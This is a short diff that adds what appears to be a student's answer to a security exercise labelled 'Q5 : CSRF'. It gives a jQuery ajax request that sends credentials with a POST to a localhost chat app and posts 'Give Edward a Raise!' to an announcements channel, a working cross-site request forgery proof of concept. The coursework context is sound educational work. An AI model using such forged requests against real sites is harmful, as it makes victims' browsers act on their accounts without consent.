@@ -1,0 +1,19 @@
+Q5 : CSRF
+I made the following ajax request:
+
+$.ajax({
+      url: 'http://localhost:8000/post',
+      type: 'POST',
+      data: {
+        "channel": "#announcements",
+        "message": "Give Edward a Raise!"
+      },
+      xhrFields: {
+      withCredentials: true
+   }
+    });
+    
+it uses the CSRF vulnerability (suprisingly in my firefox, the same-site cookies were already disabled).
+
+this is a normal ajax request, sending message to channel announcements when clicking on it.
+
